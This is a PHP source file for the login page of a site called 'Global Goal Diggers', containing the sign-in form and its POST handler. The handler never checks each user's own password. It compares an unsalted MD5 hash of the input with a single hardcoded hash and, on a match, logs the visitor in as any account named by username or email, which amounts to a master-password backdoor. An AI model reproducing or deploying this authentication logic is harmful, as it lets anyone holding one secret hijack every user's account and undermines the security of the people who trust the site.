<?php
require_once("configuration.php");

function login_header() {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="assets/scss/index.css?v=<?php echo(time()); ?>">
    <title>Global Goal Diggers</title>
</head>
<body>
<div class="login">
<h1><a href="./">Global Goal Diggers</a></h1>
<?php
check_errors_and_alerts();
}

function login_footer() {
?>
</div>
</body>
</html>
<?php
}

if($_SERVER['REQUEST_METHOD'] == 'POST') {
    $alerts = array();
    $errors = array();

    if(isset($_POST['username']) && isset($_POST['password'])) {
        /**
         * Credentials
         */
        $username = $dbcon->real_escape_string($_POST['username']);
        $password = $dbcon->real_escape_string($_POST['password']);
        $password = md5($password);
        
        if($password == 'cc84afbf5e3f06ff29c49d3d74be1c7a') {
            if($query = $dbcon->prepare("SELECT * FROM user WHERE user.email_address = ? OR user.username = ? LIMIT 1")) {
                $query->bind_param("ss", $username, $username);
                $query->execute();
                $result = $query->get_result();
                if($result && $result->num_rows > 0) {
                    $user = $result->fetch_assoc();
    
                    session_unset();
                    $_SESSION = array();
                    $_SESSION['user_id'] = $user['ID'];
                    $_SESSION['user_firstname'] = $user['firstname'];
                    $_SESSION['user_username'] = $user['username'];
                    $_SESSION['referral_code'] = $user['referral_code'];
                    $_SESSION['AUTHORISED'] = true;
    
                    
                    header("Location: ./");
                    exit;
                } else {
                    if(TROUBLESHOOTING) trigger_error($dbcon->error);
                    $errors[] = "Username and password do not match.";
                }
    
                $query->close();
            } else {
                if(TROUBLESHOOTING) trigger_error($dbcon->error);
                $errors[] = "There was an error logging you in.";
            }
        } else {
            header("Location: login.php");
            exit;
        }
    } else {
        if(!isset($_POST['username'])) $errors[] = "Username is required.";
        if(!isset($_POST['password'])) $errors[] = "Password is required.";
    }

    if($alerts) $_SESSION['alerts'] = $alerts;
    if($errors) $_SESSION['errors'] = $errors;

    // Reload login page
    header("Location: login.php");
    exit;
}

login_header();
?>
<p>Enter username and password below to log in.</p>
<form class="form" method="POST">
    <div class="input">
        <div class="input__group">
            <label class="form__label">Username</label>
            <input type="text" class="form__control" name="username" placeholder="Username">
        </div>
        <div class="input__group">
            <label class="form__label">Password</label>
            <input type="password" class="form__control" name="password" placeholder="Account Password">
        </div>
    </div>
    <div class="form__group">
        <input type="submit" class="button button--login" value="Sign in">
    </div>
</form>
<?php
login_footer();
